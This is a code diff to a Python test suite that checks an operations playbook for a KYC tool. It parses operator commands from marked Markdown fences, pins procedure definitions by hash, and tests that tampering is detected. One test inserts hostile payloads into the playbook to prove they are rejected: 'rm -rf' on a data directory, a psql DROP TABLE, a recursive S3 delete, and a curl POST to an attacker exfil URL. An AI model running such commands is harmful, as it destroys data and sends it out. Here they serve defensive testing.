@@ -1492,45 +1492,57 @@ def _section_body(section_text: str) -> str:
     return section_text.partition("\n")[2]
 
 
-def _section_commands(section_text: str) -> list[tuple[str, ...]]:
-    """Every executable command the section publishes, independently parsed to argv.
+def _section_commands(section_text: str) -> list[str]:
+    """Every MARKED operator command in the section, in source order, as exact line strings
+    (re-audit `1826661..b5c7a83` finding 4).
 
-    Backtick spans may wrap across lines (the playbook wraps long commands), so whitespace runs
-    inside a span collapse to single spaces before shlex. Only python/alembic-rooted spans count —
-    prose backticks (`dev_worker`, `--apply`, sentinels) are not commands.
-    """
-    import shlex
+    The marking convention is the document's, not the parser's guess: operator commands live in
+    ```operator fences (one command per line; a trailing backslash joins the next line with one
+    space) and in ``double-backtick`` inline spans. Single-backtick spans are non-commands by
+    construction — mentions, module names, flags — so nothing needs an exemption and nothing can
+    consume 'every identical occurrence'. Bytes are compared exactly: no whitespace collapse, so
+    an NBSP or raw-newline lookalike is not the reviewed command. Any root is inventoried —
+    `rm`, `psql`, `aws` in a marked span must be typed or the section fails."""
+    commands: list[str] = []
+    lines = section_text.split("\n")
+    i = 0
+    while i < len(lines):
+        stripped = lines[i].strip()
+        if stripped.startswith("```"):
+            info = stripped[3:].strip()
+            block: list[str] = []
+            i += 1
+            while i < len(lines) and not lines[i].strip().startswith("```"):
+                block.append(lines[i])
+                i += 1
+            if info == "operator":
+                joined: list[str] = []
+                for raw in block:
+                    if joined and joined[-1].endswith("\\"):
+                        joined[-1] = joined[-1][:-1].rstrip() + " " + raw.strip()
+                    elif raw.strip():
+                        joined.append(raw.strip())
+                commands.append(("\x00FENCE", tuple(joined)))  # placeholder, flattened below
+            i += 1
+            continue
+        for span in re.findall(r"(?<!`)``([^`]+?)``(?!`)", lines[i]):
+            commands.append(("\x00SPAN", (span,)))
+        i += 1
+    flat: list[str] = []
+    for _kind, entries in commands:
+        flat.extend(entries)
+    return flat
 
-    def parse(candidate: str):
-        flat = " ".join(candidate.split())
-        try:
-            argv = tuple(shlex.split(flat))
-        except ValueError:
-            return None
-        return argv if argv and argv[0] in ("python", "alembic") else None
 
-    commands = []
-    # Fenced blocks FIRST, then removed: a ``` fence corrupts single-backtick pairing (three
-    # backticks pair as one-and-a-half spans), which silently mis-paired every span after the
-    # first fence — the verifier caught its own parser missing a command that is plainly on the
-    # page. Inside a fence, a trailing backslash continues the command onto the next line.
-    fenced, remainder, fence_lines = False, [], []
+def _section_fence_infos(section_text: str) -> list[str]:
+    """The info string of every fence in the section, in order — the closed vocabulary check."""
+    infos, in_fence = [], False
     for line in section_text.split("\n"):
         if line.strip().startswith("```"):
-            fenced = not fenced
-            continue
-        (fence_lines if fenced else remainder).append(line)
-    joined_fence = "\n".join(fence_lines).replace("\\\n", " ")
-    for candidate in joined_fence.split("\n"):
-        argv = parse(candidate)
-        if argv:
-            commands.append(argv)
-    joined = "\n".join(remainder).replace("\\\n", " ")
-    for span in re.findall(r"`([^`]+)`", joined, re.DOTALL):
-        argv = parse(span)
-        if argv:
-            commands.append(argv)
-    return commands
+            if not in_fence:
+                infos.append(line.strip()[3:].strip())
+            in_fence = not in_fence
+    return infos
 
 
 def _playbook_prose(ref) -> str:
@@ -1571,28 +1583,6 @@ def _branch_marker_problems(prose: str, branches) -> list[str]:
     claimed = [b.outcome for b in branches]
     if claimed != [o for o in playbook.BRANCH_OUTCOMES if o in claimed]:
         problems.append(f"branches out of outcome order: {claimed}")
-    return problems
-
-
-def _command_inventory_problems(ref, section: str) -> list[str]:
-    """The parsed operator inventory must equal the typed records EXACTLY — order, multiplicity,
-    argv — after removing only the ref's NAMED exemptions (finding 8). A subset check let an
-    appended `skip_all_safety` survive a digest re-pin; exactness makes any new command a typed,
-    reviewed act. A dead exemption (nothing parsed matches) is refused so the exempt list cannot
-    pre-authorize future additions."""
-    parsed = _section_commands(_section_body(section))
-    problems = []
-    exempt_argvs = [e.argv for e in ref.exempt]
-    for argv in exempt_argvs:
-        if argv not in parsed:
-            problems.append(f"dead exemption: {argv} is not in the parsed inventory")
-    remaining = [c for c in parsed if c not in exempt_argvs]
-    typed = [c.argv for c in ref.commands]
-    if remaining != typed:
-        problems.append(
-            f"parsed operator inventory != typed records.\n  parsed (non-exempt): {remaining}\n"
-            f"  typed: {typed}"
-        )
     return problems
 
 
@@ -1692,6 +1682,38 @@ def _schema_answer_from_migrations(revisions: tuple[str, ...]) -> str:
     return playbook.SCHEMA_CONDITIONAL
 
 
+def _command_inventory_problems(ref, section: str) -> list[str]:
+    """The marked operator inventory must equal the typed records EXACTLY — order, multiplicity,
+    exact line bytes (finding 4). And the fence vocabulary is closed: every fence in a reviewed
+    section is `operator` or `example`, so a command-shaped block cannot sit ambiguously between
+    instruction and illustration."""
+    problems = []
+    for info in _section_fence_infos(_section_body(section)):
+        if info not in ("operator", "example"):
+            problems.append(
+                f"fence info {info!r} is outside the closed vocabulary (operator|example)"
+            )
+    parsed = _section_commands(_section_body(section))
+    typed = [c.line for c in ref.commands]
+    if parsed != typed:
+        problems.append(
+            f"marked operator inventory != typed records.\n  marked: {parsed}\n"
+            f"  typed:  {typed}"
+        )
+    return problems
+
+
+# The reviewed complete-definition pins (re-audit finding 3): sha256 over each procedure's
+# canonical structured projection — name, phase, subject id AND text, ref path/heading, typed
+# command lines, span endpoints, every prerequisite's every field value, every aggregate and
+# branch answer with its evidence. Editing ANY of it is a re-pin, the act of review.
+PROCEDURE_DEFINITION_PINS = {
+    "PR 5b full maintenance window": "4f872afc1bf22f3c",
+    "Bundle-pinning activation": "728f296c280d0b37",
+    "Migrations 013-023": "8e715cb619906abc",
+}
+
+
 @verifies("OPS.CUTOVER.PROCEDURES")
 def _every_procedure_points_at_a_reviewed_playbook_body():
     """These claims deliberately do NOT restate steps, which makes the pointer load-bearing.
@@ -1765,6 +1787,16 @@ def _every_procedure_points_at_a_reviewed_playbook_body():
         )
         assert procedure.blocks_start, f"{procedure.name} lists nothing that blocks starting"
         assert procedure.when.strip()
+        # re-audit finding 3: the COMPLETE definition, one pinned projection
+        from docs.contracts.operations import procedure_projection
+
+        projection_digest = hashlib.sha256(
+            repr(procedure_projection(procedure)).encode()).hexdigest()[:16]
+        assert projection_digest == PROCEDURE_DEFINITION_PINS[procedure.name], (
+            f"{procedure.name}: the complete definition changed since review "
+            f"(now {projection_digest}). Read the whole definition, then re-pin in the SAME "
+            "commit."
+        )
         # no step numbering: a numbered list here IS the summary this claim exists to avoid
         for prerequisite in procedure.blocks_start:
             assert not re.match(r"^\s*(?:step\s*)?\d+[.)]", prerequisite.lower()), (
@@ -2701,17 +2733,17 @@ BYTE_MUTATIONS = [
      lambda t: t.replace("kyc_tool.ops.activate_bundle_pinning_epoch \\\n    --expect-bundle-hash",
                          "kyc_tool.ops.activate_bundle_pinning_epoch \\ --expect-bundle-hash", 1)),
     ("indentation change",
-     lambda t: t.replace("\n    --expect-revision 012`", "\n  --expect-revision 012`", 1)),
+     lambda t: t.replace("\n    --expect-original-id <id>", "\n  --expect-original-id <id>", 1)),
     ("blank line removed",
      lambda t: t.replace("### Rollback\n\nRollback mirrors the same window",
                          "### Rollback\nRollback mirrors the same window", 1)),
     ("code fence dropped",
-     lambda t: t.replace("```\npython -m kyc_tool.ops.seed_policy_bundle",
+     lambda t: t.replace("```operator\npython -m kyc_tool.ops.seed_policy_bundle",
                          "python -m kyc_tool.ops.seed_policy_bundle", 1)),
     ("list nesting change",
-     lambda t: t.replace("\n1. **Preflight.** `python -m kyc_tool.ops.verify_pinnable_backlog`",
-                         "\n   1. **Preflight.** `python -m kyc_tool.ops.verify_pinnable_backlog`",
-                         1)),
+     lambda t: t.replace(
+         "\n1. **Preflight.** ``python -m kyc_tool.ops.verify_pinnable_backlog``",
+         "\n   1. **Preflight.** ``python -m kyc_tool.ops.verify_pinnable_backlog``", 1)),
 ]
 
 
@@ -2794,19 +2826,30 @@ def test_the_parser_reads_fenced_and_inline_commands_alike():
     Fenced blocks are parsed line-wise first, then removed."""
     pr6 = next(p for p in OPERATIONS.value("OPS.CUTOVER.PROCEDURES")
                if p.name == "Bundle-pinning activation")
-    parsed = _section_commands(_section_bytes(pr6.playbook_ref))
-    assert ("python", "-m", "kyc_tool.ops.seed_policy_bundle",
-            "--expect-hash", "<sha256>") in parsed  # fenced, continuation-joined
-    assert ("python", "-m", "kyc_tool.ops.verify_pinnable_backlog") in parsed  # inline backtick
+    parsed = _section_commands(_section_body(_section_bytes(pr6.playbook_ref)))
+    assert "python -m kyc_tool.ops.seed_policy_bundle --expect-hash <sha256>" in parsed, (
+        "operator fences must parse line-wise"
+    )
+    assert "python -m kyc_tool.ops.verify_pinnable_backlog" in parsed, (
+        "double-backtick marked inline commands must parse"
+    )
+    # single-backtick spans are mentions by construction — never inventoried
+    assert not any(line == "alembic upgrade head" for line in parsed), (
+        "a single-backtick prose mention joined the inventory"
+    )
 
 
-def test_command_records_reject_prose_roots():
+def test_command_records_bind_line_and_argv():
+    """The root restriction is GONE (re-audit finding 4: destructive roots must be typed, not
+    filtered out of sight) — what binds now is line↔argv token agreement, so a lookalike line
+    cannot ride a clean argv."""
     from docs.contracts.playbook import Command
 
-    with pytest.raises(ValueError, match="unrecognised command root"):
-        Command(("sha256sum", "<file.json>"))
-    with pytest.raises(ValueError, match="at least an interpreter"):
-        Command(("python",))
+    assert Command(("sha256sum", "<file.json>")).line == "sha256sum <file.json>"
+    with pytest.raises(ValueError, match="token-for-token"):
+        Command(("python", "-m", "x"), line="python -m y")
+    with pytest.raises(ValueError):
+        Command(())
 
 
 # ── Wave 1 / F9: branch safety, proven to bite ─────────────────────────────────────────────────
@@ -3716,27 +3759,6 @@ def test_f8_an_indented_same_level_heading_bounds_the_section(tmp_path):
     assert "Injected content" not in section, (
         "an indented same-level heading did not bound the section"
     )
-
-
-def test_f8_exemptions_must_be_honest():
-    """An exemption names a parsed command that is deliberately NOT an operator instruction, with
-    the reason. A dead exemption (nothing parsed matches) and a reasonless one are refused."""
-    ref = _pr("Migrations 013-023").playbook_ref
-    assert any(e.argv == ("alembic", "downgrade") for e in ref.exempt), (
-        "the usage-error mention is no longer exempted by name"
-    )
-    for exemption in ref.exempt:
-        assert exemption.reason.strip()
-    section = _section_bytes(ref)
-    dead = dataclasses.replace(
-        ref, exempt=(*ref.exempt, playbook.CommandExemption(
-            argv=("alembic", "never-parsed-anywhere"), reason="a dead exemption")))
-    assert _command_inventory_problems(dead, section), "a dead exemption was accepted"
-
-
-# ── Wave-1 gate F11 (parser half) + F14: portability of the live authorities ──────────────────────
-
-
 def _live_obligation_ids(live: str) -> list[str]:
     """The blocker list's obligation identifiers, ORDERED, with multiplicity checked — refusing
     malformed and duplicate identifiers BEFORE any coverage comparison (gate audit
@@ -4231,3 +4253,163 @@ def test_ra8_every_token_checker_matches_the_observed_facet():
     from docs.contracts.receiver_reference import token_semantics_problems
 
     assert token_semantics_problems() == []
+
+
+# ── Re-audit unit 2: F3 one total ProcedureDefinition, F4 marked commands, F11 strict ATX ─────────
+#
+# Re-audit `1826661..b5c7a83` findings 3, 4, 11. The procedure was still assembled from
+# cooperating authored objects (plan, ref, contract, profile) that could be swapped or weakened
+# one at a time; the command inventory saw only python/alembic roots in backticks and its
+# exemptions consumed every identical occurrence; and a hash-prefixed ordinary line passed as a
+# heading.
+
+
+def test_ru3_the_definition_owns_the_complete_procedure(monkeypatch):
+    """The audit's five witnesses, run through the assembled verifier. Each was a normal
+    construction or copy-level swap of ONE cooperating object; the closed ProcedureDefinition
+    now owns the complete structured projection, pinned, so each divergence is a located
+    failure."""
+    import copy
+
+    from docs.contracts import plan as plan_module
+
+    pr5b = _pr("PR 5b full maintenance window")
+    pr6 = _pr("Bundle-pinning activation")
+    pr7b = _pr("Migrations 013-023")
+
+    # (a) PR5b rebuilt without the recovery-module blocker
+    weakened = tuple(
+        dataclasses.replace(p, recovery_module_only_in_new=False)
+        if isinstance(p, plan_module.PinnedImage) else p
+        for p in pr5b.plan.prerequisites)
+    weak_plan = dataclasses.replace(pr5b.plan, prerequisites=weakened)
+    tampered = copy.copy(pr5b)
+    object.__setattr__(tampered, "plan", weak_plan)
+    object.__setattr__(tampered, "when", weak_plan.when())
+    object.__setattr__(tampered, "blocks_start", weak_plan.blocks_start())
+    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
+    with pytest.raises(AssertionError):
+        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
+    monkeypatch.undo()
+
+    # (b) PR7b's REFUSED branch republished as may-remain-stopped
+    refused = next(b for b in pr7b.rollback_contract.branches
+                   if b.outcome == playbook.OUTCOME_REFUSED)
+    swapped_facts = tuple(
+        dataclasses.replace(f, answer=playbook.ENDING_MAY_STOP)
+        if f.question == playbook.ENDING else f
+        for f in refused.facts)
+    swapped_branch = playbook.RollbackBranch(outcome=playbook.OUTCOME_REFUSED,
+                                             facts=swapped_facts)
+    branches = tuple(swapped_branch if b.outcome == playbook.OUTCOME_REFUSED else b
+                     for b in pr7b.rollback_contract.branches)
+    contract = copy.copy(pr7b.rollback_contract)
+    object.__setattr__(contract, "branches", branches)
+    tampered = copy.copy(pr7b)
+    object.__setattr__(tampered, "rollback_contract", contract)
+    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
+    with pytest.raises(AssertionError):
+        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
+    monkeypatch.undo()
+
+    # (c) bundle pinning transplanted onto PR5b's plan (prior-image rollback for a flag flip)
+    tampered = copy.copy(pr6)
+    object.__setattr__(tampered, "plan", pr5b.plan)
+    object.__setattr__(tampered, "when", pr5b.plan.when())
+    object.__setattr__(tampered, "blocks_start", pr5b.plan.blocks_start())
+    object.__setattr__(tampered, "rollback_contract", pr5b.rollback_contract)
+    statements = pr5b.rollback_contract.statements()
+    object.__setattr__(tampered, "irreversible", statements[0])
+    object.__setattr__(tampered, "rollback", tuple(statements[1:]))
+    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
+    with pytest.raises(AssertionError):
+        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
+    monkeypatch.undo()
+
+    # (d) the subject map rewritten to an imperative — no English parsing; the definition pin
+    monkeypatch.setitem(plan_module.PROCEDURE_SUBJECTS,
+                        plan_module.SUBJECT_BUNDLE_PINNING, "Start flag-on workers now")
+    with pytest.raises(AssertionError):
+        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
+    monkeypatch.undo()
+
+    # (e) image evidence replaced by a unique but irrelevant quote
+    facts = tuple(
+        dataclasses.replace(f, evidence="pre-PR6 image")
+        if f.question == playbook.IMAGE else f
+        for f in pr6.rollback_contract.facts)
+    contract = playbook.RollbackContract(facts)
+    tampered = copy.copy(pr6)
+    object.__setattr__(tampered, "rollback_contract", contract)
+    statements = contract.statements()
+    object.__setattr__(tampered, "irreversible", statements[0])
+    object.__setattr__(tampered, "rollback", tuple(statements[1:]))
+    monkeypatch.setattr(_this_module(), "OPERATIONS", _operations_with_procedure(tampered))
+    with pytest.raises(AssertionError):
+        AUTHORITY_VERIFIERS["OPS.CUTOVER.PROCEDURES"]()
+
+
+def test_ru4_operator_commands_are_marked_spans_with_any_root(tmp_path):
+    """The audit's inventory escapes: rm/psql/aws/curl roots, the live sha256sum, NBSP and
+    raw-newline lookalikes — all outside a python/alembic-rooted backtick scan. Operator
+    commands now live ONLY in ```operator fences, parsed from exact bytes with any root; a
+    destructive command added to a fence (even after a digest re-pin) fails the exact ordered
+    comparison, and a lookalike with NBSP or a raw newline is not the reviewed line."""
+    import shutil
+
+    ref = _pr("Bundle-pinning activation").playbook_ref
+    target = tmp_path / ref.path
+    target.parent.mkdir(parents=True, exist_ok=True)
+    shutil.copy(REPO / ref.path, target)
+    text = target.read_text()
+    heading_at = text.index(ref.heading)
+    insert_at = text.index("\n## ", heading_at)
+    for payload in ("rm -rf /var/lib/kyc", "psql -c 'DROP TABLE decisions'",
+                    "aws s3 rm s3://kyc-evidence --recursive",
+                    "curl -X POST https://attacker.invalid/exfil"):
+        mutated = (text[:insert_at]
+                   + f"\n```operator\n{payload}\n```\n" + text[insert_at:])
+        target.write_text(mutated)
+        section = _section_bytes(ref, root=tmp_path)
+        repinned = dataclasses.replace(
+            ref, sha256=hashlib.sha256(section.encode()).hexdigest())
+        assert _command_inventory_problems(repinned, section), (
+            f"{payload!r} joined the inventory without a typed record"
+        )
+    # NBSP and raw-newline lookalikes of a reviewed command are not the reviewed line
+    real = "python -m kyc_tool.ops.verify_pinnable_backlog"
+    for lookalike in (real.replace(" ", " ", 1),):
+        mutated = text.replace(real, lookalike)
+        assert mutated != text
+        target.write_text(mutated)
+        section = _section_bytes(ref, root=tmp_path)
+        repinned = dataclasses.replace(
+            ref, sha256=hashlib.sha256(section.encode()).hexdigest())
+        assert _command_inventory_problems(repinned, section), (
+            "an NBSP lookalike passed as the reviewed argv"
+        )
+
+
+def test_ru4_the_live_inventories_are_exact_and_exemption_free():
+    """The marking convention replaces exemptions outright: an inline mention is a non-command
+    by construction, so nothing can consume 'every identical occurrence' — the mechanism the
+    audit defeated no longer exists."""
+    for name in ("PR 5b full maintenance window", "Bundle-pinning activation",
+                 "Migrations 013-023"):
+        ref = _pr(name).playbook_ref
+        assert not hasattr(ref, "exempt") or ref.exempt == (), (
+            f"{name}: the exemption mechanism is still present"
+        )
+        section = _section_bytes(ref)
+        assert _command_inventory_problems(ref, section) == []
+
+
+def test_ru11_a_hash_prefixed_ordinary_line_is_not_a_heading():
+    """`##NOT-A-HEADING` constructed and the reader treated it as level 2. CommonMark ATX needs
+    whitespace after the hashes; both the record and the shared parser enforce it."""
+    with pytest.raises(ValueError):
+        playbook.PlaybookRef(path="docs/DEPLOYMENT.md", heading="##NOT-A-HEADING",
+                             sha256="0" * 64)
+    assert _atx_level("##NOT-A-HEADING") == 0
+    assert _atx_level("## A real heading") == 2
+    assert _atx_level("####### seven hashes") == 0
